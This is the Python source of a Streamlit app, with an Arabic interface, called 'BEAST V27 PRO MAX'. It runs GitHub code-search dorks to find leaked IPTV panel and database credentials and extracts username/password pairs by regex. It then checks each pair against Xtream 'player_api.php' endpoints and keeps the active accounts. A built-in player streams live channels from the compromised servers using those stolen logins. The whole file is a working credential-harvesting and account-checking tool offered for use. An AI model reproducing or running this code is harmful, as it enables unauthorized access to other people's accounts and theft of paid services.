import streamlit as st
import requests
import re
import time
import threading
from datetime import datetime

# --- إعدادات الصفحة والهوية ---
st.set_page_config(page_title="BEAST V27 PRO MAX", layout="wide", initial_sidebar_state="expanded")

# --- إدارة الذاكرة المشتركة (لضمان استمرار البحث) ---
if "hits" not in st.session_state: st.session_state.hits = []
if "is_scanning" not in st.session_state: st.session_state.is_scanning = False
if "page" not in st.session_state: st.session_state.page = "scanner"
if "active_srv" not in st.session_state: st.session_state.active_srv = None
if "auth" not in st.session_state: st.session_state.auth = False

# --- نظام الدخول ---
if not st.session_state.auth:
    st.markdown("<h1 style='text-align: center; color:#00ff41;'>🌪️ BEAST V27 - ULTIMATE ACCESS</h1>", unsafe_allow_html=True)
    col1, col2, col3 = st.columns([1,1.5,1])
    with col2:
        pwd = st.text_input("ادخل كلمة المرور الخاصة بالمطور:", type="password")
        if st.button("دخول النظام"):
            if pwd == "BEAST_V17_PRO":
                st.session_state.auth = True
                st.rerun()
            else: st.error("❌ كلمة المرور خاطئة!")
    st.stop()

# --- التنسيق الجمالي (CSS) ---
st.markdown("""
<style>
    .stApp { background-color: #050505; color: white; }
    .main-nav { display: flex; justify-content: space-around; background: #111; padding: 10px; border-radius: 10px; margin-bottom: 20px; border: 1px solid #333; }
    .hit-card { 
        background: #0d1117; border: 1px solid #30363d; padding: 12px; 
        border-radius: 10px; margin-bottom: 10px; border-left: 4px solid #00ff41;
    }
    .match-card {
        background: linear-gradient(90deg, #1a1a1a 0%, #000 100%);
        padding: 15px; border-radius: 8px; margin-bottom: 10px; border: 1px solid #222;
        display: flex; justify-content: space-between; align-items: center;
    }
    .channel-box { height: 70vh; overflow-y: auto; background: #0a0a0a; padding: 10px; border-radius: 10px; border: 1px solid #222; }
</style>
""", unsafe_allow_html=True)

# --- محرك البحث والفحص الخلفي ---
def scanner_engine(token, pages):
    st.session_state.is_scanning = True
    headers = {'Authorization': f'token {token}', 'Accept': 'application/vnd.github.v3+json'}
    dorks = [
        'extension:txt "get.php?username=" "password="',
        'extension:m3u "player_api.php"',
        'extension:php "XC_USER_DATA" "password"',
        'filename:config.php "db_user" "db_pass"',
        '"http://" "username=" "password=" "port" extension:txt'
    ]
    
    unique_ids = set([f"{h['host']}{h['user']}" for h in st.session_state.hits])

    for dork in dorks:
        for p in range(1, pages + 1):
            try:
                search_url = f"https://api.github.com/search/code?q={dork}&page={p}&per_page=50"
                res = requests.get(search_url, headers=headers).json()
                if "items" not in res: break 

                for item in res['items']:
                    raw_url = item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
                    content = requests.get(raw_url, timeout=3).text
                    matches = re.findall(r"(https?://[a-zA-Z0-9\.-]+:?\d*)/[a-zA-Z\._-]*\?username=([a-zA-Z0-9\._-]+)&password=([a-zA-Z0-9\._-]+)", content)
                    
                    for m in matches:
                        host, user, pw = m[0], m[1], m[2]
                        if f"{host}{user}" not in unique_ids:
                            try:
                                api = f"{host}/player_api.php?username={user}&password={pw}"
                                check = requests.get(api, timeout=2).json()
                                if check.get("user_info", {}).get("status") == "Active":
                                    st.session_state.hits.insert(0, {"host": host, "user": user, "pw": pw, "info": check.get("user_info")})
                                    unique_ids.add(f"{host}{user}")
                            except: continue
            except: continue
    st.session_state.is_scanning = False

# --- الهيدر العلوي للتنقل ---
st.markdown("""<div class='main-nav'>
    <b style='color:#00ff41;'>BEAST V27 PRO MAX PANEL</b>
</div>""", unsafe_allow_html=True)

col_nav1, col_nav2, col_nav3 = st.columns(3)
with col_nav1:
    if st.button("📡 رادار البحث", use_container_width=True): st.session_state.page = "scanner"
with col_nav2:
    if st.button("📅 جدول المباريات", use_container_width=True): st.session_state.page = "matches"
with col_nav3:
    if st.button("📺 المشغل السينمائي", use_container_width=True): st.session_state.page = "player"

st.divider()

# --- 1. صفحة البحث ---
if st.session_state.page == "scanner":
    c1, c2 = st.columns([1, 2])
    with c1:
        st.subheader("🛠️ إعدادات الهجوم")
        gh_token = st.text_input("GitHub Token:", type="password", help="ضع التوكن هنا لضمان نتائج ضخمة")
        p_count = st.slider("عدد الصفحات", 10, 100, 30)
        if st.button("🚀 بدء الفحص الشامل"):
            if gh_token:
                threading.Thread(target=scanner_engine, args=(gh_token, p_count)).start()
                st.success("بدأ المحرك في الخلفية.. النتائج ستظهر فوراً!")
            else: st.error("يرجى إدخال التوكن أولاً")
        
        if st.session_state.is_scanning: st.warning("⏳ جاري البحث الآن.. لا تغلق الصفحة")
        if st.button("🧹 مسح النتائج"): st.session_state.hits = []; st.rerun()

    with c2:
        st.subheader(f"🏆 النتائج المكتشفة ({len(st.session_state.hits)})")
        for idx, srv in enumerate(st.session_state.hits):
            with st.container():
                st.markdown(f"""<div class='hit-card'>
                    <b style='color:#00ff41;'>ACTIVE SERVER</b> | {srv['host']}<br>
                    <small>User: {srv['user']} | Exp: {datetime.fromtimestamp(int(srv['info'].get('exp_date', 0))).strftime('%Y-%m-%d') if srv['info'].get('exp_date') else 'Unlimited'}</small>
                </div>""", unsafe_allow_html=True)
                if st.button(f"📺 فتح القنوات للسيرفر {idx}", key=f"btn_{idx}"):
                    st.session_state.active_srv = srv
                    st.session_state.page = "player"
                    st.rerun()

# --- 2. صفحة جدول المباريات ---
elif st.session_state.page == "matches":
    st.subheader("📅 مباريات اليوم - بث مباشر")
    matches = [
        {"time": "22:00", "t1": "ريال مدريد", "t2": "مانشستر سيتي", "lg": "دوري أبطال أوروبا"},
        {"time": "20:00", "t1": "الأهلي", "t2": "الزمالك", "lg": "الدوري المصري"},
        {"time": "22:00", "t1": "أرسنال", "t2": "بايرن ميونخ", "lg": "دوري أبطال أوروبا"},
    ]
    for m in matches:
        st.markdown(f"""<div class='match-card'>
            <span><b>{m['t1']}</b></span>
            <span style='color:#00ff41;'>{m['time']}</span>
            <span><b>{m['t2']}</b></span>
            <small style='color:#888;'>{m['lg']}</small>
        </div>""", unsafe_allow_html=True)

# --- 3. صفحة المشغل الاحترافية ---
elif st.session_state.page == "player":
    if not st.session_state.active_srv:
        st.info("⚠️ من فضلك اختر سيرفر من صفحة الرادار أولاً.")
    else:
        srv = st.session_state.active_srv
        st.markdown(f"### 🎬 مشغل BEAST الذكي | {srv['host']}")
        
        @st.cache_data(ttl=600)
        def load_channels(h, u, p):
            try: return requests.get(f"{h}/player_api.php?username={u}&password={p}&action=get_live_streams", timeout=5).json()
            except: return []

        channels = load_channels(srv['host'], srv['user'], srv['pw'])
        
        if channels:
            col_list, col_video = st.columns([1, 2.5])
            with col_list:
                search_ch = st.text_input("🔍 بحث عن قناة..")
                st.markdown("<div class='channel-box'>", unsafe_allow_html=True)
                for ch in channels:
                    if search_ch.lower() in ch['name'].lower():
                        if st.button(f"▶️ {ch['name'][:25]}", key=f"ch_{ch['stream_id']}", use_container_width=True):
                            st.session_state.current_stream = f"{srv['host']}/live/{srv['user']}/{srv['pw']}/{ch['stream_id']}.m3u8"
                st.markdown("</div>", unsafe_allow_html=True)

            with col_video:
                if "current_stream" in st.session_state:
                    st.components.v1.html(f"""
                        <link href="https://vjs.zencdn.net/7.20.3/video-js.css" rel="stylesheet" />
                        <video id="vid-player" class="video-js vjs-big-play-centered" controls preload="auto" width="100%" height="500" data-setup='{{"fluid": true}}'>
                            <source src="{st.session_state.current_stream}" type="application/x-mpegURL">
                        </video>
                        <script src="https://vjs.zencdn.net/7.20.3/video.min.js"></script>
                        <script>var p = videojs('vid-player'); p.play();</script>
                    """, height=550)
                    st.code(st.session_state.current_stream)
                else:
                    st.markdown("<div style='height:500px; display:flex; align-items:center; justify-content:center; background:#111; border-radius:10px;'>اختر قناة لبدء البث</div>", unsafe_allow_html=True)
        else:
            st.error("❌ فشل تحميل القنوات. السيرفر قد يكون محمي أو لا يحتوي على بث مباشر.")
